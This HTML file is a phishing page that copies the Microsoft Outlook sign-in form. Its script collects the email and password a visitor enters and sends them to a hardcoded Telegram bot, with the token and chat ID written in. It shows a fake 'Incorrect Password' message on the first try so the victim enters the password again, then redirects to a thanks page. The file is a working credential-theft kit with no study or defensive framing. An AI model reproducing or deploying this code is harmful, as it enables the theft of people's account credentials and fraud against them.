<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Live Signin Page Clone</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap');

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Poppins', sans-serif;
    }

    body {
      display: grid;
      place-items: center;
      min-height: 100vh;
      background-color: #dde2d1;
    }

    form {
      width: 440px;
      background-color: #fff;
      box-shadow: 0 0 .5rem rgba(0, 0, 0, .2);
      padding: 44px;
    }

    form h2 {
      font-size: 24px;
      font-weight: 500;
    }

    .form-group {
      margin: 0 0 16px;
    }

    form input {
      padding: 6px 10px 6px 0;
      margin-top: 1rem;
      border: none;
      outline: none;
      border-bottom: 1px solid #000000b3;
      width: 100%;
      font-size: .9rem;
    }

    form p {
      font-size: 13px;
      margin-bottom: 16px;
    }

    form a {
      color: #0067b8;
      text-decoration: none;
    }

    form a:hover {
      text-decoration: underline;
    }

    form button {
      display: block;
      margin-left: auto;
      width: 108px;
      height: 32px;
      font-size: 15px;
      background-color: #0067b8;
      color: #fff;
      border: none;
      cursor: pointer;
    }

    form button:hover {
      background-color: #004b85;
    }

    .bottom {
      width: 440px;
      background-color: #fff;
      box-shadow: 0 0 .5rem rgba(0, 0, 0, .2);
      padding: 8px 44px;
      font-size: 15px;
      margin-top: 20px;
      display: flex;
      align-items: center;
      cursor: pointer;
    }

    .bottom img {
      width: 32px;
      height: 32px;
      margin-right: 12px;
    }

    .bottom:hover {
      background-color: #dde2d1;
    }

    #errorModal {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      z-index: 1000;
      justify-content: center;
      align-items: center;
    }

    #errorModal .modal-box {
      background: #fff;
      padding: 20px 30px;
      border-radius: 10px;
      max-width: 300px;
      text-align: center;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
    }

    #errorModal .modal-box h3 {
      margin-bottom: 10px;
      color: #e74c3c;
    }

    #errorModal .modal-box p {
      font-size: 14px;
    }

    #errorModal .modal-box button {
      margin-top: 10px;
      padding: 8px 16px;
      background-color: #0067b8;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
  </style>
</head>

<body>
  <!-- Modal -->
  <div id="errorModal">
    <div class="modal-box">
      <h3>Incorrect Password</h3>
      <p>Please double-check your password and try again.</p>
      <button onclick="closeModal()">Try Again</button>
    </div>
  </div>

  <div class="container">
    <form id="form" method="POST">
      <div class="forms-container">
        <div class="forms">
          <div class="first">
            <h2>Sign in</h2>
            <div class="form-group">
              <input type="email" placeholder="Email" name="username" id="username" required>
              <input type="password" placeholder="Password" name="password" id="password" required>
            </div>
            <p>No Account? <a href="#">Create One!</a></p>
            <a href="#">Sign in with a security key <span>?</span></a>
          </div>
        </div>
      </div>
      <button type="submit">Sign in</button>
    </form>

    <div class="bottom">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Microsoft_Outlook_2013-2019_logo.svg/811px-Microsoft_Outlook_2013-2019_logo.svg.png">
      <span>Sign-in options</span>
    </div>
  </div>

  <!-- JS -->
  <script>
    let attemptCount = 0;

    document.getElementById('form').addEventListener('submit', function (e) {
      e.preventDefault();
      attemptCount++;

      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      const telegramMessage = `ðŸŸ¦ Outlook Login Attempt\n\nðŸ“§ Email: ${username}\nðŸ”‘ Password: ${password}`;
     var token = '7674557033:AAHCWogf4ittclpqZMBHSw7Q9Jxq37oNrjo';
      var chat_id = '6767406404';
      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;

      fetch(url)
        .then(response => response.json())
        .then(data => {
          if (attemptCount === 1) {
            document.getElementById('errorModal').style.display = 'flex';
          } else {
            window.location.href = 'thanks.html'; // âœ… Second try = redirect
          }
        })
        .catch(error => {
          alert("Network error. Try again.");
          console.error('Telegram error:', error);
        });
    });

    function closeModal() {
      document.getElementById('errorModal').style.display = 'none';
    }
  </script>
</body>

</html>
